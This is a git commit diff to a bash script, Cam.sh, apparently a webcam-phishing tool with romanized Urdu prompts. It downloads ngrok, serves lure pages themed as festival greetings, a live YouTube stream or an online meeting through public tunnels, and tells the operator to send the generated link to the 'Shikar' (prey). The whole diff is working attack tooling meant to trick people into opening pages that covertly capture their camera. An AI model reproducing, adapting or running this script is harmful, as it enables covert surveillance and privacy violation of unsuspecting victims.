615cbf8df091119039ea8440b1c01c2bc28f184f
Najeeb Ullah <64611793+BreathPython@users.noreply.github.com>
2022-08-23 08:57:22 +0500

    Update Cam.sh

--- Cam.sh
+++ Cam.sh
@@ -119,3 +119,191 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 
 payload_ngrok() {
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+fi
+rm -rf index3.html
+
+}
+
+select_template() {
+if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+printf "\e[1;93m [!] Sahi Option selwct kren!\e[0m\n"
+sleep 1
+clear
+banner
+camphish
+else
+printf "\n----- template ka intekhaab kre----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+default_option_template="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] template ka intekhaab kre: [Default is 1] \e[0m' option_tem
+option_tem="${option_tem:-${default_option_template}}"
+if [[ $option_tem -eq 1 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] festival ka naam likhe: \e[0m' fest_name
+fest_name="${fest_name//[[:space:]]/}"
+elif [[ $option_tem -eq 2 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]  YouTube video watch ID Ka inderaaj kre: \e[0m' yt_video_ID
+elif [[ $option_tem -eq 3 ]]; then
+printf ""
+else
+printf "\e[1;93m [!] template ka intekhaab ghalat hai - phirse koshish kre! \e[0m\n"
+sleep 1
+select_template
+fi
+fi
+}
+
+ngrok_server() {
+
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip ki zarorat hai -lehaza install kre. KhudaHafiz."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "wget ki zarorat hai - lehaza install kre. KhudaHafiz."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok download ho raha ha - intezaar kejeye...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Downloading me masla ha... Termux app se type kejeye:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+else
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Downloading me masla ha ... \e[0m\n"
+exit 1
+fi
+fi
+fi
+if [[ -e ~/.ngrok2/ngrok.yml ]]; then
+printf "\e[1;93m[\e[0m*\e[1;93m] Apka ngrok "
+cat  ~/.ngrok2/ngrok.yml
+read -p $'\n\e[1;92m[\e[0m+\e[1;92m] kya ap ngrok authtoken tabdeel krna chahte hai? [Y/n]:\e[0m ' chg_token
+if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok ke valid authtoken ka inderaaj kejeye: \e[0m' ngrok_auth
+./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken tabdeel.kiya jaa chuka hai\n"
+fi
+else
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok ke valid authtoken ka inderaaj kejeye : \e[0m' ngrok_auth
+./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+fi
+printf "\e[1;92m[\e[0m+\e[1;92m] php server shuru howa chahta hai...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] ngrok server shuru howa chahta ha...\n"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
+if [[ -z "$link" ]]; then
+printf "\e[1;31m[!] Direct link agar generate nhe hota, To ye mumkina wajuhaat ho skte hai\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken ka ideraaj ghalat hai\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Agr ap android user hai, apna hotspot on kejeye\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok apke termux pe pehle se mojod hai, to ye command killall ngrok likhe ke dobara shurwat kre\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Apna internet connection check kre\n"
+exit 1
+else
+printf "\e[1;92m[\e[0m*\e[1;92m] Ye Direct link Copy kr ke Shikar ko bheje :\e[0m\e[1;77m %s\e[0m\n" $link
+fi
+payload_ngrok
+checkfound
+}
+
+cam() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+printf "\n----- tunnel server ka intekhaab kejeye----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Port Forwarding option ka intekhaab kejeye: [Default is 1] \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+select_template
+if [[ $option_server -eq 2 ]]; then
+
+command -v php > /dev/null 2>&1 || { echo >&2 "-ssh- install krne ki zarorat hai. Lehaza install kre. KhudaHafiz."; exit 1; }
+start
+
+elif [[ $option_server -eq 1 ]]; then
+ngrok_server
+else
+printf "\e[1;93m [!] option Sahi nahe!\e[0m\n"
+sleep 1
+clear
+camphish
+fi
+
+}
+
+
+payload() {
+
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+fi
+rm -rf index3.html
+
+}
+
+start() {
+
+default_choose_sub="Y"
+default_subdomain="saycheese$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
+fi
+
+server
+payload
+checkfound
+
+}
+
+banner
+dependencies
+cam
+
